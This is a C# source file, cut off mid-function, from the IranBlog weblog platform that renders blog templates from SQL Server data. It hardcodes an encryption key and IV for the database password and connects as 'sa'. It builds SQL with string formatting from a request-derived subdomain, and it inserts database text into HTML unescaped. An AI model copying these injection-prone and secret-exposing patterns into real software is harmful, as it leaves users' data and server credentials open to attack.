/*
	All rights reserved to Alireza Poshtkohi (c) 1999-2023.
	Email: arp@poshtkohi.info
	Website: http://www.poshtkohi.info
*/

using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Web.UI;
using System.Data;
using System.Data.SqlClient;
using AlirezaPoshtkoohiLibrary;
using System.Runtime.InteropServices;
using System.DirectoryServices;
//using ServerManagement;

using System.Configuration;
using System.Web.Configuration;

using System.Web.UI.WebControls;
using System.Web.UI.HtmlControls;
using System.Web;
using System.Diagnostics;
using DotGrid.DotSec;
using Components;

namespace AlirezaPoshtkoohiLibrary
{
	public class blogcontent
	{
        [DllImport("Netapi32.dll")]
		private extern static int NetUserAdd([MarshalAs(UnmanagedType.LPWStr)] string servername, int level, ref USER_INFO_1 buf, int parm_err);
		[DllImport("Netapi32.dll")]
		private extern static int NetUserDel([MarshalAs(UnmanagedType.LPWStr)] string servername, [MarshalAs(UnmanagedType.LPWStr)] string username);
		[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
			public struct USER_INFO_1
		{
			public string usri1_name; 
			public string usri1_password; 
			public int usri1_password_age; 
			public int usri1_priv; 
			public string usri1_home_dir; 
			public string comment; 
			public int usri1_flags; 
			public string usri1_script_path;
		}

        private static Page ___page;
        private static string[] _adsTiltles = new string[] { "برنامه نویسی", "آموزش برنامه نویسی", "طراحی نرم افزار", "آموزش طراحی وب", "زبان برنامه نویسی C#", "آموزش پایگاه داده", "طراحی وب", "آموزش برنامه نویسی پیشرفته" };
        //private static string[] _adsTiltles = new string[] { "کتابخانه دیجیتالی دریا", "بزرگترین کتابخانه دیجیتالی ایران", "کتابخانه مجازی ریا", "کتابخانه الکترونیکی دریا", "130،000 عنوان کتاب" };
		private const string WeblogUrl = "http://www.iranblog.com/services/";
        private const string SecureWeblogUrl = "https://www.iranrnblog.com/services/";
        private const string ForwardUrl = "/closed.aspx";
        private const string DdosForwardUrl = "/ddos.html";
        private const string CommentsUrlPage = "http://www.iranblog.com/comments/";
        private const string NewCommentsUrlPage = "http://commenting.iranblog.com/services/commenting/commenting.aspx";
		private const string DomainBlog = "iranblog.com";
        private const string SQLServerAddress = "192.168.17.134";//"localhost";
		private const string ZoneName = "iranblog.com";

		private const string RootDircetoryWeblogs = @"D:\Projects\IranBlog\weblogs";
        //private const string RootDircetoryWeblogs = @"C:\Inetpub\vhosts\iranblog2.com\private\weblogs";

		private const string SQLUsername = "sa";
		//private const string SQLPassowrd = "test";
		private const string SQLWeblogsDbUsername = "sa";
		//private const string SQLWeblogsDbPassowrd = "test";

        //private static DateTime PastCommentingSystemDate = new DateTime(2007,8,26);

        private static string SQLPassowrd
        {
            get
            {
                if (System.Web.HttpRuntime.Cache["_db_p"] == null)
                {
                    RijndaelEncryption1 _rijndael = new RijndaelEncryption1(RijndaelEncryption1.Base64StringToBinary(key), RijndaelEncryption1.Base64StringToBinary(IV));
                    Configuration config = WebConfigurationManager.OpenWebConfiguration("/MyAppRoot");
                    AppSettingsSection _appSettings = (AppSettingsSection)config.GetSection("appSettings");
                    System.Web.HttpRuntime.Cache.Insert("_db_p", RijndaelEncryption1.BinaryToString(_rijndael.decrypt(RijndaelEncryption1.Base64StringToBinary(_appSettings.Settings["db_p"].Value))));
                }
                return (string)System.Web.HttpRuntime.Cache["_db_p"];
            }
        }
        private static string SQLWeblogsDbPassowrd
        {
            get
            {
                return SQLPassowrd;
            }
        }

		private const string SQLDatabaseName = "general";
        private const string SQLPagesDatabaseName = "iranblog-pages";

		private const string SQLUsersInformationTableName = "usersInfo";
		private const string SQLCommentsTableName = "comments";
        private const string SQLLinksTableName = "links";
        private const string SQLLinkssTableName = "linkss";
        private const string SQLSubjectedArchiveTableName = "SubjectedArchive";
        private const string SQLPollResponsesTableName = "PollResponses";
        private const string SQLPollQuestionsTableName = "PollQuestions";
        private const string SQLTeamWeblogTableName = "TeamWeblog";
        private const string SQLDomainsTableName = "domains";

        private const string SQLWeblogsDbName = "weblogs";
        private const string SQLPostsTableName = "posts";

        private const int MaxLinksShow = 10;
        private const int PagingNumber = 6;//6
        //public const int MaxPostShow = 10;//5 or 10, 15

		private const string key = "MUJejvsCAhuzqWCbxZldWbtVJWDl9ML8h+dFYjIVlcI=";
		private const string IV = "ZjPAUxY8q7mw/S+9gslTkQ==";

		private static string ConnectString = "database=" + SQLDatabaseName + ";server=" + SQLServerAddress +
			";User Id=" + SQLUsername + ";Password=" + SQLPassowrd +";Connect Timeout=30;";

		private static string ConnectStringWeblogsDb = "database=" + SQLWeblogsDbName + ";server=" + SQLServerAddress +
			";User Id=" + SQLWeblogsDbUsername + ";Password=" + SQLWeblogsDbPassowrd +";Connect Timeout=30;";

        private static string ConnectionStringPagesDatabase = "database=" + SQLPagesDatabaseName + ";server=" + SQLServerAddress +
            ";User Id=" + SQLWeblogsDbUsername + ";Password=" + SQLWeblogsDbPassowrd + ";Connect Timeout=30;";
        //--------------------------------------------------------------------------
        public static void AlirezaConversion(ref string buffer)
        {
           buffer= buffer.Replace("http://alireza.iranblog.com/alireza.poshtkohi", "http://www.peyghamak.com/alireza.poshtkohi");
           buffer = buffer.Replace("http://iranblog.com/alireza.poshtkohi", "http://www.peyghamak.com/alireza.poshtkohi");
           buffer = buffer.Replace("http://www.iranblog.com/alireza.poshtkohi", "http://www.peyghamak.com/alireza.poshtkohi");
           buffer = buffer.Replace("../../alireza.poshtkohi/", "http://www.peyghamak.com/alireza.poshtkohi/");
        }


		//--------------------------------------------------------------------------
		static private string FindSubdomain(Page page)
		{
			//return page.Request.Url.Host.Substring(0, page.Request.Url.Host.IndexOf('.'));
			if(String.Compare(page.Request.Url.Host, DomainBlog) == 0)
				return page.Request.Url.Host.Substring(0, page.Request.Url.Host.IndexOf('.'));
			else 
				return page.Request.Url.Host.Substring(0, page.Request.Url.Host.IndexOf("." + DomainBlog));
		}
		//--------------------------------------------------------------------------
		static private string HomeAddress(Page page)
		{
			return "http://" + page.Request.Url.Host + "/";
		}
		//--------------------------------------------------------------------------
		static private  string ToPersianNumberString(int number, bool isOrdinal) 
		{
			if (number < 1 || 9999 < number) return number.ToString();
			if (number == 1 && isOrdinal) return "اول";
			string[,] Units = new string[,] {
					  {"", "یک", "دو", "سه", "چهار", "پنج", "شـش", "هفت", "هشت", "نه"},
					  {"", "ده", "بیست", "سی", "چهل", "پنجاه", "شصت", "هفتاد", "هشتاد", "نود"},
					  {"", "صد", "دویست", "سیصد", "چهارصد", "پانصد", "ششصد", "هفتصد", "هشتصد", "نه‌صد"},
					  {"", "هزار", "دوهزار", "سه‌هزار", "چهارهزار", "پنج‌هزار", "شش‌هزار", "هفت‌هزار", "هشت‌هزار", "نه‌هزار"}
											};
			string OrdinalSuffix = "م";
			if (number%100 == 30) OrdinalSuffix = "‌ام";
			String str = "";
			for (int i = 3 ; i >= 0; i--) 
			{
				int p = (int)Math.Pow(10,i);
				string s = Units[i, (number%(10*p)-number%p)/p];
				if (str != "" &&  s!= "") str += " و ";
				if (10 < number && number < 5) 
				{
					str += new string[] {"یازده", "دوازده", "سیزده", "چهارده", "پانزده", "شانزده", "هفده", "هجده", "نوزده"}[number-11];
					break;
				}
				else 
				{
					if (s=="سه" && isOrdinal) s = "سو";
					str += s;
				}
				number %= p;
			}
			if (isOrdinal) 
			{
				str += OrdinalSuffix;
			}
			return str;
		}
        //--------------------------------------------------------------------------
        private static string AvatorFormat(string str)
        {
            //string str = "sss<img src=\"{$$avator}\"  width=100>";

            int _p1 = str.IndexOf("<img src=\"{$$avator}\"");

            if (_p1 >= 0)
            {
                int _p2 = str.IndexOf(">", _p1);

                if(_p2 < 0)
                    _p2 = str.IndexOf("/>", _p1);
                if (_p2 > 0)
                {
                    str = str.Remove(_p1, _p2 - _p1 + 1);
                }
            }
            return str;
        }
		//--------------------------------------------------------------------------
		/*static private string PersianDate(DateTime dt)
		{
			PersianCalendar pcal = new PersianCalendar();
			string[] PersianMonthNames = new string[] {"فروردین", "اردیبهشت", "خرداد", "تیر", "مرداد", "شهریور", "مهر", "آبان", "آذر", "دی", "بهمن", "اسفند"};
			string[] PersianWeekNames = new string[] {"یکشنبه", "دوشنبه", "سه شنبه", "چهارشنبه", "پنجشنبه", "جمعه", "شنبه"};
			string  pdate = PersianWeekNames[Convert.ToInt32(pcal.GetDayOfWeek(dt))];
			pdate += "، " + ToPersianNumberString(pcal.GetDayOfMonth(dt), true);
			pdate += " " + PersianMonthNames[pcal.GetMonth(dt) - 1];
			pdate += " " + ToPersianNumberString(pcal.GetYear(dt), false);
			return pdate;
		}*/
        static private string PersianDate(DateTime dt)
        {
            PersianCalendar pcal = new PersianCalendar();
            string[] PersianMonthNames = new string[] { "فروردین", "اردیبهشت", "خرداد", "تیر", "مرداد", "شهریور", "مهر", "آبان", "آذر", "دی", "بهمن", "اسفند" };
            string[] PersianWeekNames = new string[] { "یکشنبه", "دوشنبه", "سه شنبه", "چهارشنبه", "پنجشنبه", "جمعه", "شنبه" };
            string pdate = PersianWeekNames[Convert.ToInt32(pcal.GetDayOfWeek(dt))];
            pdate += "، " + pcal.GetDayOfMonth(dt).ToString();//ToPersianNumberString(pcal.GetDayOfMonth(dt), true);
            pdate += " " + PersianMonthNames[pcal.GetMonth(dt) - 1];
            pdate += " " + ToPersianNumberString(pcal.GetYear(dt), false);
            return pdate;
        }
		//--------------------------------------------------------------------------
		static private string PrintTime(DateTime dt)
		{
			PersianCalendar pcal = new PersianCalendar();
			uint hour = (uint) pcal.GetHour(dt);
			uint minute = (uint) pcal.GetMinute(dt);
			string time = "";
			if(hour == 0)
			{
				time += "12" + ":";
				if(minute < 10)
				{
					time += "0" + minute.ToString();
				}
				else
				{
					time += minute.ToString();
				}
				time += " AM";
			}
			if(hour == 12)
			{
				time += hour.ToString() + ":";
				if(minute < 10)
				{
					time += "0" + minute.ToString();
				}
				else
				{
					time += minute.ToString();
				}
				time += " PM";
			}
			else
			{
				if(hour >= 1 && hour < 12)
				{
					time += hour.ToString() + ":";
					if(minute < 10)
					{
						time += "0" + minute.ToString();
					}
					else
					{
						time += minute.ToString();
					}
					time += " AM";
				}
				if(hour > 12)
				{
					time += (hour - 12).ToString() + ":";
					if(minute < 10)
					{
						time += "0" + minute.ToString();
					}
					else
					{
						time += minute.ToString();
					}
					time += " PM";
				}
			}
			return time;
		}
		//--------------------------------------------------------------------------
		static private int GeorgianMonthHowMuchDays(int MonthNumber, int YearNumber)
		{
			int days = 28;
			switch(MonthNumber)
			{
				case 1: //January
				{
					days = 31;
					break;
				}
				case 2: //February
				{
					if(YearNumber%4 == 0)
					{
						days = 29;
					}
					else
					{
						days = 28;
					}
					break;
				}
				case 3: //March
				{
					days = 31;
					break;
				}
				case 4: //April
				{
					days = 30;
					break;
				}
				case 5: //May
				{
					days = 31;
					break;
				}
				case 6: //June
				{
					days = 30;
					break;
				}
				case 7: //July
				{
					days = 31;
					break;
				}
				case 8: //August
				{
					days = 31;
					break;
				}
				case 9: //September
				{
					days = 30;
					break;
				}
				case 10: //October
				{
					days = 31;
					break;
				}
				case 11: //November
				{
					days = 30;
					break;
				}
				case 12: //December
				{
					days = 31;
					break;
				}
			}
			return days;
		}
		//--------------------------------------------------------------------------
        static public string BlogInfos(string buffer, Page page, ref PostViewInfo _postViewInfo)
        {
            try
            {
                buffer = buffer.Replace("</head>", "<script src=\"http://www.iranblog.com/sc/style.js\" language=\"javascript\" type=\"text/javascript\"></script></head>");
                buffer = buffer.Replace("</HEAD>", "<script src=\"http://www.iranblog.com/sc/style.js\" language=\"javascript\" type=\"text/javascript\"></script></HEAD>");
                if(_postViewInfo.BlogID == (Int64)14231)
                {
                    AlirezaConversion(ref buffer);
                }
                DateTime GenerataionTime = DateTime.Now;
                string email = "";
                SqlConnection connection = new SqlConnection(ConnectString);
                SqlCommand command = connection.CreateCommand();
                command.CommandText = String.Format("SELECT i,title,about,email,emailEnable,dateRegister,f,MaxPostShow,PostNum,ImageGuid,ArciveDisplayMode,ChatBoxIsEnabled FROM {0} WHERE IsWeblogExpired=0 AND subdomain='{1}'", SQLUsersInformationTableName, _postViewInfo.Subdomain);
                connection.Open();
                SqlDataReader read = command.ExecuteReader();
                _postViewInfo.BlogID = -1;
                _postViewInfo.PostNum = 0;
                if (read.HasRows)
                {
                    read.Read();
                    if ((string)read["f"] == "n")
                    {
                        read.Close();
                        command.Dispose();
                        page.Response.Write("<HTML><HEAD><TITLE>IranBlog Web Filter Blocking Page (www.iranblog.com) </TITLE><META http-equiv=Content-Type content='text/html; charset=utf-8'><META http-equiv=Content-Language content=en-fa></HEAD><BODY><P>&nbsp;</P>  <P>&nbsp;</P>   <P>&nbsp;</P><P>&nbsp;</P><P align=center><B><FONT face='Arabic Transparent' color=#800000 size=5>مشترک گرامي<P align=center><B><FONT face='Arabic Transparent' color=#800000 size=5>دسترسي به اين سايت امکان پذير نمي باشد</P></font></b></font></b><p align=center><span lang='en-us'><b><font face='Arabic Transparent' size=5 color=#800000>Created By IranBlog Web Filter Software</font></b></span></p></BODY></HTML>");
                        page.Response.OutputStream.Flush();
                        return "";
                    }
                    buffer = Regex.Replace(buffer, "(\\{\\$\\$title\\})", (string)read["title"]);
                    string metaTag = String.Format("<head>\r\n<META NAME=\"description\" CONTENT=\"{0}\"><META NAME=\"keywords\" CONTENT=\"{0}, Blog, Weblog, Persian,Iran, Iranian, Farsi, Weblogs, Blogs\">", (string)read["title"]);
                    buffer = buffer.Replace("<head>", metaTag);
                    buffer = buffer.Replace("<HEAD>", metaTag);
                    string about = (string)read["about"];

                    if (about == ".در این قسمت هیچ رکوردی وجود ندارد")
                        buffer = buffer.Replace("{$$AboutData}",  "");
                    else
                        buffer = Regex.Replace(buffer, "(\\{\\$\\$AboutData\\})", about);

                    //buffer = buffer.Replace("location", "");
                    //TagDelete(ref buffer, "iframe");
                    //TagDelete(ref buffer, "IFRAME");

                    //buffer = buffer.Replace("window.open", "");

                    _postViewInfo.BlogID = (Int64)read["i"];
                    _postViewInfo.PostNum = (int)read["PostNum"];
                    _postViewInfo.MaxPostShow = (int)read["MaxPostShow"];
                    _postViewInfo.ArciveDisplayMode = (bool)read["ArciveDisplayMode"];
                    _postViewInfo.ChatBoxIsEnabled = (bool)read["ChatBoxIsEnabled"];
                    buffer = Regex.Replace(buffer, "(\\{\\$\\$ArchiveData\\})", BlogArchive((DateTime)read["dateRegister"], _postViewInfo.ArciveDisplayMode));
                    buffer = Regex.Replace(buffer, "(\\{\\$\\$subdomain\\})", HomeAddress(page));
                    string[] rets = ((string)read["ImageGuid"]).Split(new char[] { ',' }); //rets[0]=ServerName,ret[1]=FoderPart,ret[2]=guid
                    if (rets[2] == "default")
                        buffer = AvatorFormat(buffer);
                    else
                        buffer = Regex.Replace(buffer, "(\\{\\$\\$avator\\})", String.Format("http://test111.{0}/users/images/{1}.jpg", ZoneName, rets[2]));

                    email = (string)read["email"];
                    if ((bool)read["emailEnable"])
                    {
                        buffer = Regex.Replace(buffer, "(\\{\\$\\$email\\})", email);
                    }
                    else
                    {
                        buffer = Regex.Replace(buffer, "(\\{\\$\\$email\\})", "");
                    }
                }
                else
                {
                    _postViewInfo.BlogID = -1;// meaning expired weblog
                    read.Close();
                    return null;
                }
                read.Close();
                command.Dispose();

                /*buffer = Regex.Replace(buffer, "(<HEAD>)", "<HEAD>\n\t<script src=\"http://www.iranblog.com/banner/banner.aspx\" type=\"text/javascript\"></script>\n\t" +
                    "<script language=\"javascript\">IranBlogAdvertisment();</script>");
                buffer = Regex.Replace(buffer, "(<head>)", "<head>\n\t<script src=\"http://www.iranblog.com/banner/banner.aspx\" type=text/javascript></script>\n\t" +
                    "<script language=javascript>IranBlogAdvertisment();</script><script language=\"javascript\" src=\"/js/stat2.js\"></script>");*/
                if (_postViewInfo.BlogID > 0)
                {
                    //==================Subjected Archive============================
                    //connection = new SqlConnection(ConnectString);
                    command = new SqlCommand(String.Format("SELECT id,subject,PostNum FROM {0} WHERE BlogID={1}", SQLSubjectedArchiveTableName, _postViewInfo.BlogID), connection);
                    //connection.Open();
                    read = command.ExecuteReader();
                    string SubjectedArchive = "";
                    string category = null;
                    if (read.HasRows)
                        while (read.Read())
                        {
                            category = (string)read["subject"];
                            _postViewInfo.AddCategory((Int64)read["id"], category);
                            SubjectedArchive += String.Format("<a href=\"/?mode=SubjectedArchive&id={0}\" target=\"_self\">({1}) {2}</a><br>", read["id"], read["PostNum"], category);
                        }
                    buffer = Regex.Replace(buffer, "(\\{\\$\\$SubjectedArchive\\})", SubjectedArchive);
                    read.Close();
                    command.Dispose();
                    //==================AuthorsList Archive==========================
                    int p1 = buffer.IndexOf("<{AuthorsList}>") + "<{AuthorsList}>".Length;
                    int p2 = -1;
                    if (p1 >= 0)
                        p2 = buffer.IndexOf("</{AuthorsList}>", p1);
                    if (p1 >= 0 && p2 >= 0)
                    {
                        string buff = buffer.Substring(p1, p2 - p1);
                        string temp = "";
                        //connection = new SqlConnection(ConnectString);
                        command = new SqlCommand(String.Format("SELECT id,name,PostNum FROM {0} WHERE BlogID={1}", SQLTeamWeblogTableName, _postViewInfo.BlogID), connection);
                        //connection.Open();
                        read = command.ExecuteReader();
                        string AuthorsList = "";
                        string name = null;
                        if (read.HasRows)
                            while (read.Read())
                            {
                                name = (string)read["name"];
                                _postViewInfo.AddAuthor((Int64)read["id"], name);
                                temp = Regex.Replace(buff, "(\\{\\$\\$name\\})", name);
                                temp = Regex.Replace(temp, "(\\{\\$\\$posts\\})", ((int)read["PostNum"]).ToString());
                                temp = Regex.Replace(temp, "(\\{\\$\\$url\\})", "?mode=Authors&id=" + (Int64)read["id"]);
                                AuthorsList += temp;
                            }
                        read.Close();
                        command.Dispose();

                        p1 -= "<{AuthorsList}>".Length;
                        p2 += "</{AuthorsList}>".Length;
                        buffer = buffer.Replace(buffer.Substring(p1, p2 - p1), AuthorsList);
                    }
                    //==================Daily Links================================
                    //connection = new SqlConnection(ConnectString);
                    command = new SqlCommand(String.Format("SELECT TOP {0} title,url FROM {1} WHERE BlogID={2}", MaxLinksShow, SQLLinksTableName, _postViewInfo.BlogID), connection);
                    //connection.Open();
                    read = command.ExecuteReader();
                    string links = "";
                    //--
                    //links = "<a href=\"http://learn.peyghamak.com\" target=\"_blank\" style='font-size: 0.25pt'>آموزش برنامه نویسی پیشرفته</a><a href=\"http://math.peyghamak.com\" target=\"_blank\" style='font-size: 0.25pt'>آموزش خصوصی ریاضی</a><br>";
                    /*if ((new Random((int)DateTime.Now.Ticks)).Next(1, 3) == 1)
                    {*/
                        //links = String.Format("<a href=\"http://www.daryalib.ir/\" target=\"_blank\">{0}</a><br>", _adsTiltles[(new Random((int)DateTime.Now.Ticks)).Next(0, _adsTiltles.Length - 1)]);
                        //links = String.Format("<a href=\"http://learn.peyghamak.com/\" target=\"_blank\">{0}</a><br>", _adsTiltles[(new Random((int)DateTime.Now.Ticks)).Next(0, _adsTiltles.Length - 1)]);
                    //}
                    /*if ((new Random((int)DateTime.Now.Ticks)).Next(1, 4) == 1)
                    {
                        links = "<a href=\"http://research.iranblog.com/\" target=\"_blank\">Grid Computing</a><br>";
                    }*/
                    //--
                    if (read.HasRows)
                    {
                        while (read.Read())
                            links += String.Format("<a href=\"{0}\" target=\"_blank\">{1}</a><br>", read["url"], read["title"]);
                        buffer = Regex.Replace(buffer, "(\\{\\$\\$LinksArchive\\})", String.Format("<A onclick=\"window.open('http://www.iranblog.com/ShowLinks.aspx?id={0}',null,'width=500, height=400, scrollbars=yes, resizable=yes');\" href=\"javascript:void(0)\" style=\"text-decoration:none\">آرشیو پیوندهای روزانه</a>", _postViewInfo.BlogID));
                    }
                    else
                        buffer = Regex.Replace(buffer, "(\\{\\$\\$LinksArchive\\})", "");
                    buffer = Regex.Replace(buffer, "(\\{\\$\\$links\\})", links);
                    read.Close();
                    command.Dispose();
                    //==================Links======================================
                    //connection = new SqlConnection(ConnectString);
                    command = new SqlCommand(String.Format("SELECT title,url FROM {0} WHERE BlogID={1}", SQLLinkssTableName, _postViewInfo.BlogID), connection);
                    //connection.Open();
                    read = command.ExecuteReader();
                    links = "";
                    //--
                    //links = "<a href=\"http://www.peyghamak.com\" target=\"_blank\">.::میکروبلاگ پیغامک::.</a><br>";
                    //--
                    if (read.HasRows)
                        while (read.Read())
                            links += String.Format("<a href=\"{0}\" target=\"_blank\">{1}</a><br>", read["url"], read["title"]);
                    buffer = Regex.Replace(buffer, "(\\{\\$\\$\\$links\\})", links);
                    read.Close();
                    command.Dispose();
                    //==================Polls======================================
                    //connection = new SqlConnection(ConnectString);
                    command = new SqlCommand(String.Format("SELECT id,QuestionText FROM {0} WHERE BlogID={1}", SQLPollQuestionsTableName, _postViewInfo.BlogID), connection);
                    //connection.Open();
                    read = command.ExecuteReader();
                    Int64 QuestionID = -1;
                    string QuestionText = "";
                    if (read.Read())
                    {
                        QuestionID = (Int64)read["id"];
                        QuestionText = (string)read["QuestionText"];
                    }
                    read.Close();
                    if (QuestionID > 0)
                    {
                        command = new SqlCommand(String.Format("SELECT id,ResponseText FROM {0} WHERE QuestionID={1} AND BlogID={2}", SQLPollResponsesTableName, QuestionID, _postViewInfo.BlogID), connection);
                        //connection.Open();
                        read = command.ExecuteReader();
                        if (read.HasRows)
                        {
                            string poll = String.Format("<form name='poll' method='post' action='/services/PollResults.aspx' target=\"poll\" onSubmit=\"window.open('', 'poll', 'toolbar=0,location=0,status=0,menubar=0,scrollbars=1,resizable=0,width=505,height=200')\">{0}<br><input type='hidden' name='question' value='{1}'><input type='hidden' name='QuestionText' value='{0}'>", QuestionText, QuestionID);
                            bool first = false;
                            while (read.Read())
                            {
                                if (!first)
                                {
                                    poll += String.Format("{0}<input type=\"radio\" value=\"{1}\" name=\"response\" checked><br>", (string)read["ResponseText"], (Int64)read["id"]);
                                    first = true;
                                }
                                else
                                    poll += String.Format("{0}<input type=\"radio\" value=\"{1}\" name=\"response\"><br>", (string)read["ResponseText"], (Int64)read["id"]);
                            }
                            poll += "<input type='submit' value=\"تاييد\"></form>";
                            buffer = Regex.Replace(buffer, "(\\{\\$\\$poll\\})", poll);
                        }
                        else
                        {
                            buffer = Regex.Replace(buffer, "(\\{\\$\\$poll\\})", "");
                        }
                        read.Close();
                    }
                    else
                    {
                        buffer = Regex.Replace(buffer, "(\\{\\$\\$poll\\})", "");
                    }
                    command.Dispose();
                    //==================RSS========================================
                    buffer = Regex.Replace(buffer, "(\\{\\$\\$rss\\})", String.Format("http://{0}.iranblog.com/services/rss.aspx", _postViewInfo.Subdomain));
                    //==================IM=========================================
                    if (email.Trim().IndexOf("yahoo.com") > 0 || email.Trim().IndexOf("YAHOO.COM") > 0)
                    {
                        string IM = email.Substring(0, email.IndexOf("@"));
                        buffer = Regex.Replace(buffer, "(\\{\\$\\$IM\\})", IM);
                    }
                    else
                        buffer = Regex.Replace(buffer, "(\\{\\$\\$IM\\})", "");
                    //==================Paging=====================================
                    //-----Normal Paging shows the paging of normal pages without considering the subjected, date archive and authers modes
                    string mode = page.Request.QueryString["mode"];
                    string id = page.Request.QueryString["id"];
                    if (id != null && id != "" && mode != null && string.Compare(mode, "SubjectedArchive") == 0)
                    {
                        try { Convert.ToInt64(id); }
                        catch { return buffer; }

                        //connection = new SqlConnection(ConnectString);
                        command = connection.CreateCommand();
                        command.CommandText = String.Format("SELECT PostNum FROM {0} WHERE id={1} AND BlogID={2}", blogcontent.SQLSubjectedArchiveTableName, id, _postViewInfo.BlogID);
                        //connection.Open();
                        read = command.ExecuteReader();
                        if (!read.HasRows)
                        {
                            read.Close();
                            //connection.Close();
                            command.Dispose();
                            buffer = DoPaging(buffer, "normal", "", page, _postViewInfo.PostNum, _postViewInfo.MaxPostShow);
                            //return buffer;
                        }
                        else
                        {
                            read.Read();
                            _postViewInfo.PostNum = (int)read["PostNum"];
                            read.Close();
                            //connection.Close();
                            command.Dispose();
                            buffer = DoPaging(buffer, "SubjectedArchive", id, page, _postViewInfo.PostNum, _postViewInfo.MaxPostShow);
                            //return buffer;
                        }
                    }
                    if (id != null && id != "" && mode != null && string.Compare(mode, "Authors") == 0)
                    {
                        try { Convert.ToInt64(id); }
                        catch { return buffer; }

                        //connection = new SqlConnection(ConnectString);
                        command = connection.CreateCommand();
                        command.CommandText = String.Format("SELECT PostNum FROM {0} WHERE id={1} AND BlogID={2}", blogcontent.SQLTeamWeblogTableName, id, _postViewInfo.BlogID);
                        //connection.Open();
                        read = command.ExecuteReader();
                        read.Read();
                        if (!read.HasRows)
                        {
                            read.Close();
                            //connection.Close();
                            command.Dispose();
                            buffer = DoPaging(buffer, "normal", "", page, _postViewInfo.PostNum, _postViewInfo.MaxPostShow);
                            //return buffer;
                        }
                        else
                        {
                            _postViewInfo.PostNum = (int)read["PostNum"];
                            read.Close();
                            //connection.Close();
                            command.Dispose();
                            buffer = DoPaging(buffer, "Authors", id, page, _postViewInfo.PostNum, _postViewInfo.MaxPostShow);
                            //return buffer;
                        }
                    }
                    else
                    {
                        buffer = DoPaging(buffer, "normal", "", page, _postViewInfo.PostNum, _postViewInfo.MaxPostShow);
                        //return buffer;
                    }
                    //==================Statistics ==========================
                    p1 = buffer.IndexOf("<{stat}>") + "<{stat}>".Length;
                    p2 = -1;
                    if (p1 >= 0)
                        p2 = buffer.IndexOf("</{stat}>", p1);
                    if (p1 >= 0 && p2 >= 0)
                    {
                        string buff = buffer.Substring(p1, p2 - p1);
                        string temp = "";

                        //connection = new SqlConnection(ConnectString);
                        //connection.Open();
                        command = connection.CreateCommand();
                        command.CommandText = "stat_proc";
                        command.CommandType = CommandType.StoredProcedure;



                        command.Parameters.Add("@BlogID", SqlDbType.BigInt);
                        command.Parameters["@BlogID"].Value = _postViewInfo.BlogID;

                        command.Parameters.Add("@subdomain", SqlDbType.VarChar, 50);
                        command.Parameters["@subdomain"].Value = _postViewInfo.Subdomain;

                        command.Parameters.Add("@Today", SqlDbType.DateTime);
                        command.Parameters["@Today"].Value = DateTime.Now;

                        command.Parameters.Add("@Yesterday", SqlDbType.DateTime);
                        command.Parameters["@Yesterday"].Value = DateTime.Now;

                        command.Parameters.Add("@count", SqlDbType.Int);
                        command.Parameters["@count"].Value = 0;

                        command.Parameters.Add("@TotalVisits", SqlDbType.BigInt);
                        command.Parameters["@TotalVisits"].Direction = ParameterDirection.Output;

                        command.Parameters.Add("@TodayVisits", SqlDbType.Int);
                        command.Parameters["@TodayVisits"].Direction = ParameterDirection.Output;

                        command.Parameters.Add("@YesterdayVisits", SqlDbType.Int);
                        command.Parameters["@YesterdayVisits"].Direction = ParameterDirection.Output;

                        command.Parameters.Add("@ThisMonthVisits", SqlDbType.Int);
                        command.Parameters["@ThisMonthVisits"].Direction = ParameterDirection.Output;


                        command.ExecuteNonQuery();

                        temp = Regex.Replace(buff, "(\\{\\$\\$TotalVisits\\})", ((Int64)command.Parameters["@TotalVisits"].Value).ToString());
                        temp = Regex.Replace(temp, "(\\{\\$\\$TodayVisits\\})", ((int)command.Parameters["@TodayVisits"].Value).ToString());
                        temp = Regex.Replace(temp, "(\\{\\$\\$YesterdayVisits\\})", ((int)command.Parameters["@YesterdayVisits"].Value).ToString());
                        temp = Regex.Replace(temp, "(\\{\\$\\$ThisMonthVisits\\})", ((int)command.Parameters["@ThisMonthVisits"].Value).ToString());
                        temp = Regex.Replace(temp, "(\\{\\$\\$posts\\})", _postViewInfo.PostNum.ToString());
                        temp = Regex.Replace(temp, "(\\{\\$\\$GenerataionTime\\})", (Math.Abs(((float)(GenerataionTime - DateTime.Now).TotalMilliseconds)/1000)).ToString());

                        command.Dispose();

                        p1 -= "<{stat}>".Length;
                        p2 += "</{stat}>".Length;
                        buffer = buffer.Replace(buffer.Substring(p1, p2 - p1), temp);
                    }
                    //==================Newsletter ==========================
                    p1 = buffer.IndexOf("<{newsletter}>") + "<{newsletter}>".Length;
                    p2 = -1;
                    if (p1 >= 0)
                        p2 = buffer.IndexOf("</{newsletter}>");
                    if (p1 >= 0 && p2 >= 0)
                    {
                        string temp = buffer.Substring(p1, p2 - p1);
                        temp = Regex.Replace(temp, "(\\{\\$\\$newsletter\\})", String.Format("http://{0}.iranblog.com/services/newsletter.aspx?id={1}", _postViewInfo.Subdomain, _postViewInfo.BlogID));
                        p1 -= "<{newsletter}>".Length;
                        p2 += "</{newsletter}>".Length;
                        buffer = buffer.Replace(buffer.Substring(p1, p2 - p1), temp);
                    }
                    //==================ChatBox =============================
                    /*if (_postViewInfo.ChatBoxIsEnabled)
                        buffer = buffer.Replace("{$$ChatBox}", String.Format("<div align=center><iframe id='frameLeft' border=0 name='frameLeft' marginwidth=0 marginheight=0 src='/services/ChatBox/Show.aspx?BlogID={0}' frameborder=0 width='160px' scrolling='no' height='210px' allowTransparency></iframe></div>", _postViewInfo.BlogID));
                    else
                        buffer = buffer.Replace("{$$ChatBox}", "");*/
                    if (_postViewInfo.ChatBoxIsEnabled)
                        buffer = buffer.Replace("{$$ChatBox}", String.Format("<div align=center><iframe id='frameLeft' border=0 name='frameLeft' marginwidth=0 marginheight=0 src='/services/ChatBox/Show.aspx?BlogID={0}' frameborder=0 width='160px' scrolling='no' height='210px' allowTransparency></iframe></div>", _postViewInfo.BlogID));
                    else
                        TagDelete(ref buffer, "ChatBox");
                    //=======================================================
                    
            }
                //=============================================================
                connection.Close();
                return buffer;
            }
            catch//(Exception e)
            {
                //page.Response.Write(e.ToString());
                return null;
            }
        }
        //--------------------------------------------------------------------------
        public static void TagDelete(ref string buffer, string tagName)
        {
            string start = String.Format("<{0}>", tagName);
            string end = String.Format("</{0}>", tagName);
            int p1 = buffer.IndexOf(start) + start.Length;
            int p2 = buffer.IndexOf(end);
            if (p1 >= 0 && p2 >= 0)
            {
                p1 -= start.Length;
